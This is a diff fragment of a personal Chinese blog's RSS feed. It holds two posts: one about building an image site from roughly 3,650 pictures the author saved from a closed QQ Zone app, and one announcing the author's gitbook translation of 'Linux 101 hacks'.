+      <guid>https://wrfly.kfd.me/posts/%E5%86%85%E6%B6%B5%E5%9B%BE%E7%BD%91%E7%AB%99/</guid>
+      <description>前几天做了一个内涵图的网站：http://10pic.kfd.me
+起因是上个月QQ空间的一个应用“10张内涵图”倒闭了，但是里面的图片都很好玩，我就在倒闭的那天把图片全都爬了下来，整理了大约3650张，然后做了一个这样的网站。
+原来想着是自己撸一个PHP的相册，但是觉着这样技术难度对我来收有点高。。（自己太low了）于是就利用现成的东西，hexo的博客，搭建了这样一个图片展示网站。
+图片全都储存在我的磨，原来是想放到7牛云的，但是里面注册成标准会员还要拍身份证，还要正反面，我就没啰嗦那些事儿，果断想到了“我的磨”。
+可能你会说为什么不放到VPS上啊，我的考虑是这样的，万一那天VPS关了，里面的东西这么多，一时半会儿也倒不出来，还不如放到别人哪儿，别人给你保存的好好的，虽说网速不快，但是，能用就行啊，要啥自行车啊。
+期间遇到的问题就是整理图片比较麻烦，一是重命名，二是把这些图片的url都写到md文件中，不过想好了思路，也就几行代码的事儿，期间也温习了一下怎样搭建hexo的博客，都是很草率的做事，没有什么标准的计划和方案，我想以后学了PHP在自己写一个照片库吧：）
+前前后后大约花了5个小时，不算长。
+中间在V站分享的时候，部分人说图挂了，但是我这里是好好的，不过有位知情者指出，是移动屏蔽了我的磨的网址（wodemo.com）把它换成.net(wodemo.net)就好了。再次表示感谢。
+这一个月没干什么大事，都是些鸡零狗碎的情感问题。
+打算在寒假学Python。
+还有半个多月。</description>
+    </item>
+    
+    <item>
+      <title>Linux 101 hacks的翻译-gitbook</title>
+      <link>https://wrfly.kfd.me/posts/linux-101-hacks%E7%9A%84%E7%BF%BB%E8%AF%91-gitbook/</link>
+      <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://wrfly.kfd.me/posts/linux-101-hacks%E7%9A%84%E7%BF%BB%E8%AF%91-gitbook/</guid>
+      <description>啊啊啊, 转眼间就2016年了, 时间过得真快&amp;hellip;
+最近呢也没闲着, 翻译了之前那本书, 现在进度条已经滚到20%了&amp;hellip; 自己觉着翻译的还是很好的 ^_^
+放到gitbook了,链接在此:https://www.gitbook.com/book/wrfly/linux-101-hacks/details
+对bash感兴趣的去捧个场呀~
+里面废话没有我说的这么多, 书面语言总是比口头语言简练~</description>
+    </item>
+    
+  </channel>
+</rss>
